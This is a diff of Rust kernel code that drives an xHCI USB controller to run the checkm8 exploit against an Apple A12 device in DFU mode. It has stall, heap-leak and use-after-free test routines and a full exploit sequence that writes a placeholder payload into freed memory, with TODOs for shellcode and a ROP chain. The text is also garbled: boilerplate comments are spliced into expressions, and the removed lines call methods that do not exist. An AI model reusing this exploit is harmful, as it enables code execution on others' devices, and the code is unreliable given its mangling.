@@ -107,9 +107,9 @@ const CC_STOPPED_LENGTH: u8 = 27;
 /// Find the DFU device slot_id (Apple VID=0x05AC, PID=0x1227)
 fn find_dfu_slot() -> Option<u8> {
     let devices = xhci::list_devices();
-    for device in &devices {
-        if device.vendor_id == APPLE_VID && device.product_id == DFU_PID {
-            return Some(device.slot_id);
+    for dev in &devices {
+        if dev.vendor_id == APPLE_VID && dev.product_id == DFU_PID {
+            return Some(dev.slot_id);
         }
     }
     None
@@ -118,9 +118,9 @@ fn find_dfu_slot() -> Option<u8> {
 /// Find which port the DFU device is on
 fn find_dfu_port() -> Option<u8> {
     let devices = xhci::list_devices();
-    for device in &devices {
-        if device.vendor_id == APPLE_VID && device.product_id == DFU_PID {
-            return Some(device.port);
+    for dev in &devices {
+        if dev.vendor_id == APPLE_VID && dev.product_id == DFU_PID {
+            return Some(dev.port);
         }
     }
     None
@@ -196,10 +196,10 @@ unsafe {
 
 /// Poll event ring with a configurable iteration limit.
 /// Returns (completion_code, transfer_length, endpoint_id) or None on timeout.
-fn poll_event(controller: &mut XhciController, maximum_iters: u32) -> Option<(u8, u32, u8)> {
-    for _ in 0..maximum_iters {
-        let index = controller.event_dequeue;
-        let trb = controller.event_ring[index];
+fn poll_event(controller: &mut XhciController, max_iters: u32) -> Option<(u8, u32, u8)> {
+    for _ in 0..max_iters {
+        let idx = controller.event_dequeue;
+        let trb = controller.event_ring[idx];
 
         let phase = (trb.control & TRB_CYCLE) != 0;
         if phase == controller.event_cycle {
@@ -209,7 +209,7 @@ fn poll_event(controller: &mut XhciController, maximum_iters: u32) -> Option<(u8
                 controller.event_cycle = !controller.event_cycle;
             }
 
-            let erdp_physical = controller.event_ring_physical + (controller.event_dequeue as u64 * 16);
+            let erdp_physical = controller.event_ring_phys + (controller.event_dequeue as u64 * 16);
             let intr_regs = (controller.runtime_base + 0x20) as *mut XhciIntrRegs;
                         // SAFETY: Unsafe block — bypasses Rust memory-safety guarantees. Ensure invariants manually.
 unsafe {
@@ -282,14 +282,14 @@ match cc {
 
 /// Allocate a DMA buffer (zeroed page), returns (phys, virt)
 fn allocator_dma_page() -> Option<(u64, u64)> {
-    let physical = crate::memory::frame::allocator_frame_zeroed()?;
-    let virt = physical_to_virt(physical);
-    Some((physical, virt))
+    let phys = crate::memory::frame::allocator_frame_zeroed()?;
+    let virt = physical_to_virt(phys);
+    Some((phys, virt))
 }
 
 /// Free a DMA page
-fn free_dma_page(physical: u64) {
-    crate::memory::frame::free_frame(physical);
+fn free_dma_page(phys: u64) {
+    crate::memory::frame::free_frame(phys);
 }
 
 /// Perform a full control IN transfer (Setup + Data IN + Status OUT)
@@ -373,7 +373,7 @@ fn full_control_out(
 fn dfu_getstatus(controller: &mut XhciController, slot_id: u8) -> Option<(u8, u8)> {
     let (buffer_physical, buffer_virt) = allocator_dma_page()?;
     let result = full_control_in(controller, slot_id, DFU_IN, DFU_GETSTATUS, 0, 0, 6, buffer_physical);
-    let return_value = if result.is_some() {
+    let ret = if result.is_some() {
         let b_status = // SAFETY: Unsafe block — bypasses Rust memory-safety guarantees. Ensure invariants manually.
 unsafe { ptr::read_volatile(buffer_virt as *// Compile-time constant — evaluated at compilation, zero runtime cost.
 const u8) };
@@ -385,7 +385,7 @@ const u8) };
         None
     };
     free_dma_page(buffer_physical);
-    return_value
+    ret
 }
 
 /// DFU_ABORT — no-data control request
@@ -427,10 +427,10 @@ match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
 /// DFU_DNLOAD — standard full control OUT transfer
 fn dfu_dnload(controller: &mut XhciController, slot_id: u8, data: &[u8]) -> Option<u8> {
     let (buffer_physical, buffer_virt) = allocator_dma_page()?;
-    let len = data.len().minimum(4096) as u16;
+    let len = data.len().min(4096) as u16;
     // Copy data to DMA buffer
     unsafe {
-        ptr::copy_nonoverlapping(data.as_pointer(), buffer_virt as *mut u8, len as usize);
+        ptr::copy_nonoverlapping(data.as_ptr(), buffer_virt as *mut u8, len as usize);
     }
     let result = full_control_out(controller, slot_id, DFU_OUT, DFU_DNLOAD, 0, 0, len, buffer_physical);
     free_dma_page(buffer_physical);
@@ -440,16 +440,16 @@ fn dfu_dnload(controller: &mut XhciController, slot_id: u8, data: &[u8]) -> Opti
 }
 
 /// DFU_UPLOAD — read from device
-fn dfu_upload(controller: &mut XhciController, slot_id: u8, buffer: &mut [u8]) -> Option<u32> {
+fn dfu_upload(controller: &mut XhciController, slot_id: u8, buf: &mut [u8]) -> Option<u32> {
     let (buffer_physical, buffer_virt) = allocator_dma_page()?;
-    let len = buffer.len().minimum(4096) as u16;
+    let len = buf.len().min(4096) as u16;
     let result = full_control_in(controller, slot_id, DFU_IN, DFU_UPLOAD, 0, 0, len, buffer_physical);
     if let Some(transferred) = result {
-        let copy_length = (transferred as usize).minimum(buffer.len());
+        let copy_length = (transferred as usize).min(buf.len());
                 // SAFETY: Unsafe block — bypasses Rust memory-safety guarantees. Ensure invariants manually.
 unsafe {
             ptr::copy_nonoverlapping(buffer_virt as *// Compile-time constant — evaluated at compilation, zero runtime cost.
-const u8, buffer.as_mut_pointer(), copy_length);
+const u8, buf.as_mut_ptr(), copy_length);
         }
     }
     free_dma_page(buffer_physical);
@@ -532,10 +532,10 @@ fn setup_partial_data(
     actual_data: &[u8], // What we actually send (can be shorter)
 ) -> Option<u8> {
     let (buffer_physical, buffer_virt) = allocator_dma_page()?;
-    let actual_length = actual_data.len().minimum(4096);
+    let actual_length = actual_data.len().min(4096);
         // SAFETY: Unsafe block — bypasses Rust memory-safety guarantees. Ensure invariants manually.
 unsafe {
-        ptr::copy_nonoverlapping(actual_data.as_pointer(), buffer_virt as *mut u8, actual_length);
+        ptr::copy_nonoverlapping(actual_data.as_ptr(), buffer_virt as *mut u8, actual_length);
     }
 
     {
@@ -578,10 +578,10 @@ fn setup_data_no_status(
     data: &[u8],
 ) -> Option<u8> {
     let (buffer_physical, buffer_virt) = allocator_dma_page()?;
-    let len = data.len().minimum(4096);
+    let len = data.len().min(4096);
         // SAFETY: Unsafe block — bypasses Rust memory-safety guarantees. Ensure invariants manually.
 unsafe {
-        ptr::copy_nonoverlapping(data.as_pointer(), buffer_virt as *mut u8, len);
+        ptr::copy_nonoverlapping(data.as_ptr(), buffer_virt as *mut u8, len);
     }
 
     {
@@ -642,13 +642,13 @@ fn stop_endpoint(controller: &mut XhciController, slot_id: u8) -> Option<u8> {
 
 /// **USB PORT RESET**: Reset the USB port directly via PORTSC register.
 /// Precision: a few microseconds. Way faster than userspace USB reset.
-fn port_reset(controller: &mut XhciController, port_number: u8) -> bool {
+fn port_reset(controller: &mut XhciController, port_num: u8) -> bool {
     let port_base = controller.base_virt
         + (        // SAFETY: Unsafe block — bypasses Rust memory-safety guarantees. Ensure invariants manually.
-unsafe { &*controller.capability_regs }.caplength as u64)
+unsafe { &*controller.cap_regs }.caplength as u64)
         + 0x400;
 
-    let port_regs = (port_base + ((port_number as u64 - 1) * 16)) as *mut XhciPortRegs;
+    let port_regs = (port_base + ((port_num as u64 - 1) * 16)) as *mut XhciPortRegs;
     let port = // SAFETY: Unsafe block — bypasses Rust memory-safety guarantees. Ensure invariants manually.
 unsafe { &mut *port_regs };
 
@@ -671,13 +671,13 @@ unsafe { &mut *port_regs };
 }
 
 /// Check if device is still connected on its port
-fn is_device_connected(controller: &mut XhciController, port_number: u8) -> bool {
+fn is_device_connected(controller: &mut XhciController, port_num: u8) -> bool {
     let port_base = controller.base_virt
         + (        // SAFETY: Unsafe block — bypasses Rust memory-safety guarantees. Ensure invariants manually.
-unsafe { &*controller.capability_regs }.caplength as u64)
+unsafe { &*controller.cap_regs }.caplength as u64)
         + 0x400;
 
-    let port_regs = (port_base + ((port_number as u64 - 1) * 16)) as *mut XhciPortRegs;
+    let port_regs = (port_base + ((port_num as u64 - 1) * 16)) as *mut XhciPortRegs;
     let portsc = // SAFETY: Unsafe block — bypasses Rust memory-safety guarantees. Ensure invariants manually.
 unsafe { (*port_regs).portsc };
     (portsc & PORTSC_CCS) != 0
@@ -693,8 +693,8 @@ fn delay_us(us: u32) {
 }
 
 /// Spin-wait delay in approximate milliseconds
-fn delay_mouse(mouse: u32) {
-    delay_us(mouse * 1000);
+fn delay_mouse(ms: u32) {
+    delay_us(ms * 1000);
 }
 
 // ============================================================================
@@ -737,16 +737,16 @@ match find_dfu_slot() {
         }
     };
 
-    let port_number = find_dfu_port().unwrap_or(0);
-    output.push_str(&format!("Found DFU device: slot={}, port={}\n\n", slot_id, port_number));
+    let port_num = find_dfu_port().unwrap_or(0);
+    output.push_str(&format!("Found DFU device: slot={}, port={}\n\n", slot_id, port_num));
 
     // Dispatch subcommand
     match args.trim() {
-        "status" | "s" => command_status(&mut output, slot_id, port_number),
-        "stall" | "st" => command_test_stall(&mut output, slot_id, port_number),
-        "partial" | "p" => command_test_partial(&mut output, slot_id, port_number),
-        "uaf" | "u" => command_test_uaf(&mut output, slot_id, port_number),
-        "exploit" | "e" | "go" => command_full_exploit(&mut output, slot_id, port_number),
+        "status" | "s" => cmd_status(&mut output, slot_id, port_num),
+        "stall" | "st" => command_test_stall(&mut output, slot_id, port_num),
+        "partial" | "p" => command_test_partial(&mut output, slot_id, port_num),
+        "uaf" | "u" => command_test_uaf(&mut output, slot_id, port_num),
+        "exploit" | "e" | "go" => command_full_exploit(&mut output, slot_id, port_num),
         "help" | "h" | "" => {
             output.push_str("Subcommands:\n");
             output.push_str("  status   — Query DFU device state\n");
@@ -768,18 +768,18 @@ match find_dfu_slot() {
 // Subcommand: status
 // ============================================================================
 
-fn command_status(output: &mut String, slot_id: u8, port_number: u8) {
+fn cmd_status(output: &mut String, slot_id: u8, port_num: u8) {
     output.push_str("--- DFU Device Status ---\n");
 
-    let mut controller = CONTROLLER.lock();
+    let mut ctrl = CONTROLLER.lock();
     let controller = // Pattern matching — Rust's exhaustive branching construct.
-match controller.as_mut() {
+match ctrl.as_mut() {
         Some(c) => c,
         None => { output.push_str("ERROR: xHCI controller not available\n"); return; }
     };
 
-    let connected = is_device_connected(controller, port_number);
-    output.push_str(&format!("  Port {}: connected={}\n", port_number, connected));
+    let connected = is_device_connected(controller, port_num);
+    output.push_str(&format!("  Port {}: connected={}\n", port_num, connected));
 
     if let Some((b_status, b_state)) = dfu_getstatus(controller, slot_id) {
         let state_name = // Pattern matching — Rust's exhaustive branching construct.
@@ -808,12 +808,12 @@ match b_state {
 // Subcommand: stall — test EP0 stall creation
 // ============================================================================
 
-fn command_test_stall(output: &mut String, slot_id: u8, port_number: u8) {
+fn command_test_stall(output: &mut String, slot_id: u8, port_num: u8) {
     output.push_str("--- Test: EP0 Stall Primitives ---\n\n");
 
-    let mut controller = CONTROLLER.lock();
+    let mut ctrl = CONTROLLER.lock();
     let controller = // Pattern matching — Rust's exhaustive branching construct.
-match controller.as_mut() {
+match ctrl.as_mut() {
         Some(c) => c,
         None => { output.push_str("ERROR: controller unavailable\n"); return; }
     };
@@ -834,7 +834,7 @@ match controller.as_mut() {
         } else {
             output.push_str("  Device not responding after setup-only\n");
         }
-        let alive = is_device_connected(controller, port_number);
+        let alive = is_device_connected(controller, port_num);
         output.push_str(&format!("  Connected: {}\n", alive));
     }
 
@@ -902,7 +902,7 @@ match controller.as_mut() {
     reset_to_idle(controller, slot_id);
     for i in 0..5 {
         let cc = stall_ep0_in(controller, slot_id);
-        let alive = is_device_connected(controller, port_number);
+        let alive = is_device_connected(controller, port_num);
         output.push_str(&format!("  Stall #{}: cc={:?}, alive={}\n", i, cc, alive));
         if !alive {
             output.push_str("  Device disconnected!\n");
@@ -915,12 +915,12 @@ match controller.as_mut() {
 // Subcommand: partial — test partial data transfers
 // ============================================================================
 
-fn command_test_partial(output: &mut String, slot_id: u8, port_number: u8) {
+fn command_test_partial(output: &mut String, slot_id: u8, port_num: u8) {
     output.push_str("--- Test: Partial DATA Transfers ---\n\n");
 
-    let mut controller = CONTROLLER.lock();
+    let mut ctrl = CONTROLLER.lock();
     let controller = // Pattern matching — Rust's exhaustive branching construct.
-match controller.as_mut() {
+match ctrl.as_mut() {
         Some(c) => c,
         None => { output.push_str("ERROR: controller unavailable\n"); return; }
     };
@@ -945,7 +945,7 @@ match controller.as_mut() {
             cc, cc.map(cc_name).unwrap_or("timeout")));
 
         delay_mouse(50);
-        let alive = is_device_connected(controller, port_number);
+        let alive = is_device_connected(controller, port_num);
         output.push_str(&format!("  Connected: {}\n", alive));
 
         if alive {
@@ -957,7 +957,7 @@ match controller.as_mut() {
             // Wait for device to return
             for wait in 0..60 {
                 delay_mouse(1000);
-                if is_device_connected(controller, port_number) {
+                if is_device_connected(controller, port_num) {
                     output.push_str(&format!("  Reconnected after {}s\n", wait + 1));
                     break;
                 }
@@ -970,13 +970,13 @@ match controller.as_mut() {
 // Subcommand: uaf — test Use-After-Free with stall + spray
 // ============================================================================
 
-fn command_test_uaf(output: &mut String, slot_id: u8, port_number: u8) {
+fn command_test_uaf(output: &mut String, slot_id: u8, port_num: u8) {
     output.push_str("--- Test: UAF with EP0 Stall ---\n");
     output.push_str("Sequence: stall → DNLOAD → ABORT → spray → trigger\n\n");
 
-    let mut controller = CONTROLLER.lock();
+    let mut ctrl = CONTROLLER.lock();
     let controller = // Pattern matching — Rust's exhaustive branching construct.
-match controller.as_mut() {
+match ctrl.as_mut() {
         Some(c) => c,
         None => { output.push_str("ERROR: controller unavailable\n"); return; }
     };
@@ -989,7 +989,7 @@ match controller.as_mut() {
         // Step 1: IN stall
         let stall_cc = stall_ep0_in(controller, slot_id);
         output.push_str(&format!("  1. IN stall: cc={:?}\n", stall_cc));
-        if !is_device_connected(controller, port_number) {
+        if !is_device_connected(controller, port_num) {
             output.push_str("  CRASHED at stall\n");
             continue;
         }
@@ -999,12 +999,12 @@ match controller.as_mut() {
         for i in 0..*leak_rounds {
             let dnload_data = [0u8; 0x800];
             let dn = dfu_dnload(controller, slot_id, &dnload_data);
-            if !is_device_connected(controller, port_number) {
+            if !is_device_connected(controller, port_num) {
                 output.push_str(&format!("  2. CRASHED at leak round {}\n", i));
                 break;
             }
             dfu_getstatus(controller, slot_id);
-            if !is_device_connected(controller, port_number) {
+            if !is_device_connected(controller, port_num) {
                 output.push_str(&format!("  2. CRASHED at getstatus round {}\n", i));
                 break;
             }
@@ -1012,15 +1012,15 @@ match controller.as_mut() {
         }
         output.push_str(&format!("  2. Leaked {}/{} rounds\n", leaked, leak_rounds));
 
-        if !is_device_connected(controller, port_number) { continue; }
+        if !is_device_connected(controller, port_num) { continue; }
 
         // Step 3: USB port reset
         output.push_str("  3. USB port reset...\n");
-        let reset_ok = port_reset(controller, port_number);
+        let reset_ok = port_reset(controller, port_num);
         output.push_str(&format!("     Reset: {}\n", if reset_ok { "OK" } else { "FAILED" }));
         delay_mouse(500);
 
-        if !is_device_connected(controller, port_number) {
+        if !is_device_connected(controller, port_num) {
             output.push_str("  Device gone after reset\n");
             continue;
         }
@@ -1040,9 +1040,9 @@ match controller.as_mut() {
 
         // Step 6: UPLOAD — check for leaked heap data
         let mut up_buffer = [0u8; 0x800];
-        if let Some(up_length) = dfu_upload(controller, slot_id, &mut up_buffer) {
-            let nonzero = up_buffer.iter().take(up_length as usize).any(|&b| b != 0);
-            output.push_str(&format!("  6. UPLOAD: {}B, nonzero={}\n", up_length, nonzero));
+        if let Some(up_len) = dfu_upload(controller, slot_id, &mut up_buffer) {
+            let nonzero = up_buffer.iter().take(up_len as usize).any(|&b| b != 0);
+            output.push_str(&format!("  6. UPLOAD: {}B, nonzero={}\n", up_len, nonzero));
             if nonzero {
                 output.push_str("  *** HEAP DATA LEAKED! ***\n");
                 output.push_str("  First 64 bytes: ");
@@ -1061,14 +1061,14 @@ match controller.as_mut() {
         let _ = dfu_dnload(controller, slot_id, &[0xAA; 0x800]);
         dfu_abort(controller, slot_id);
 
-        if !is_device_connected(controller, port_number) {
+        if !is_device_connected(controller, port_num) {
             output.push_str("  CRASHED at abort (io_buffer freed)\n");
             continue;
         }
 
         // Second DNLOAD — writes to freed memory
         let result = dfu_dnload(controller, slot_id, &[0x55; 0x800]);
-        if is_device_connected(controller, port_number) {
+        if is_device_connected(controller, port_num) {
             output.push_str("  *** UAF SURVIVED! Device still alive! ***\n");
         } else {
             output.push_str("  UAF triggered crash (expected on A12)\n");
@@ -1079,10 +1079,10 @@ match controller.as_mut() {
     output.push_str("\n\n[Flow B: Stall + Partial Data + Abort]\n");
     // Wait for device reconnection if needed
     for _ in 0..30 {
-        if is_device_connected(controller, port_number) { break; }
+        if is_device_connected(controller, port_num) { break; }
         delay_mouse(1000);
     }
-    if !is_device_connected(controller, port_number) {
+    if !is_device_connected(controller, port_num) {
         output.push_str("  Device not reconnected after 30s\n");
         return;
     }
@@ -1098,11 +1098,11 @@ match controller.as_mut() {
     output.push_str(&format!("  2. Setup-only DNLOAD: cc={:?}\n", cc));
 
     // Port reset (microsecond precision)
-    let reset_ok = port_reset(controller, port_number);
+    let reset_ok = port_reset(controller, port_num);
     output.push_str(&format!("  3. Port reset: {}\n", if reset_ok { "OK" } else { "FAIL" }));
     delay_mouse(500);
 
-    if is_device_connected(controller, port_number) {
+    if is_device_connected(controller, port_num) {
         if let Some((_, state)) = dfu_getstatus(controller, slot_id) {
             output.push_str(&format!("  4. State: {}\n", state));
         }
@@ -1115,13 +1115,13 @@ match controller.as_mut() {
 // Subcommand: exploit — full checkm8 sequence
 // ============================================================================
 
-fn command_full_exploit(output: &mut String, slot_id: u8, port_number: u8) {
+fn command_full_exploit(output: &mut String, slot_id: u8, port_num: u8) {
     output.push_str("--- Full checkm8 Exploit Sequence ---\n");
     output.push_str("⚠  This will attempt code execution on the A12 SecureROM.\n\n");
 
-    let mut controller = CONTROLLER.lock();
+    let mut ctrl = CONTROLLER.lock();
     let controller = // Pattern matching — Rust's exhaustive branching construct.
-match controller.as_mut() {
+match ctrl.as_mut() {
         Some(c) => c,
         None => { output.push_str("ERROR: controller unavailable\n"); return; }
     };
@@ -1141,7 +1141,7 @@ match controller.as_mut() {
     let mut stall_count = 0;
     for i in 0..6 {
         let cc = stall_ep0_in(controller, slot_id);
-        if !is_device_connected(controller, port_number) {
+        if !is_device_connected(controller, port_num) {
             output.push_str(&format!("  CRASHED at stall #{}\n", i));
             break;
         }
@@ -1156,7 +1156,7 @@ match controller.as_mut() {
     let cc = dfu_dnload(controller, slot_id, &dnload_data);
     output.push_str(&format!("  DNLOAD: {:?}\n", cc));
 
-    if !is_device_connected(controller, port_number) {
+    if !is_device_connected(controller, port_num) {
         output.push_str("  CRASHED at DNLOAD\n");
         return;
     }
@@ -1168,11 +1168,11 @@ match controller.as_mut() {
 
     // Phase 5: USB port reset — triggers abort → free(io_buffer)
     output.push_str("\n[Phase 5] USB port reset (free io_buffer)\n");
-    let reset_ok = port_reset(controller, port_number);
+    let reset_ok = port_reset(controller, port_num);
     output.push_str(&format!("  Reset: {}\n", if reset_ok { "OK" } else { "FAIL" }));
     delay_mouse(500);
 
-    if !is_device_connected(controller, port_number) {
+    if !is_device_connected(controller, port_num) {
         output.push_str("  Device left DFU after reset\n");
         return;
     }
@@ -1190,9 +1190,9 @@ match controller.as_mut() {
     // Phase 7: UPLOAD — check for heap leak
     output.push_str("\n[Phase 7] UPLOAD — heap data leak check\n");
     let mut up_buffer = [0u8; 0x800];
-    if let Some(up_length) = dfu_upload(controller, slot_id, &mut up_buffer) {
-        let nonzero = up_buffer.iter().take(up_length as usize).any(|&b| b != 0);
-        output.push_str(&format!("  UPLOAD: {}B, nonzero={}\n", up_length, nonzero));
+    if let Some(up_len) = dfu_upload(controller, slot_id, &mut up_buffer) {
+        let nonzero = up_buffer.iter().take(up_len as usize).any(|&b| b != 0);
+        output.push_str(&format!("  UPLOAD: {}B, nonzero={}\n", up_len, nonzero));
         if nonzero {
             output.push_str("  *** HEAP DATA LEAKED ***\n  ");
             for b in up_buffer.iter().take(128) {
@@ -1210,12 +1210,12 @@ match controller.as_mut() {
     let _ = dfu_dnload(controller, slot_id, &[0xAA; 0x800]);
     dfu_abort(controller, slot_id);
 
-    if is_device_connected(controller, port_number) {
+    if is_device_connected(controller, port_num) {
         // io_buffer freed, now write controlled payload
         // TODO: Replace with real payload (overwrite_value, shellcode, ROP chain)
         let payload = [0x41u8; 0x800]; // Placeholder
         let result = dfu_dnload(controller, slot_id, &payload);
-        if is_device_connected(controller, port_number) {
+        if is_device_connected(controller, port_num) {
             output.push_str("  *** UAF WRITE SURVIVED — EXPLOITATION IN PROGRESS ***\n");
             // TODO: execute payload via second USB request
         } else {
